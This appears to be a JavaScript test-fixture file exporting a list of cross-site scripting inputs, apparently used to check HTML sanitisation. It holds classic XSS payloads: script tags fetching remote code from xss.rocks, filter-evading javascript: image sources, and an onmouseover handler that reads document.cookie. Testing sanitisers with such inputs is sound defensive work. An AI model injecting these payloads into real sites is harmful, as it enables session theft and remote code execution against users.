export const XSSAttackInputs = [
    "<p><iframe>alert('XSS')</iframe> Whether you are a recent grad in your 20s or married with kids in your 30s or 40s</p>",
    "<IMG SRC=javascript:alert('XSS')></IMG>",
    "<a onmouseover=alert(document.cookie)>xxs link</a>",
    "<p><script src=http://xss.rocks/xss.js></script> Whether you are a recent grad in your 20s or married with kids in your 30s or 40s</p>",
    "<IMG SRC=jav&#x09;ascript:alert('XSS')",
    "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
    "<IMG SRC=jav	ascript:alert('XSS')>",
    "<p><ScRiPT SRC=http://xss.rocks/xss.js></SCrIPt> Whether you are a recent grad in your 20s or married with kids in your 30s or 40s</p>",
    "<IMG SRC=java\0script:alert(\"XSS\")>"
]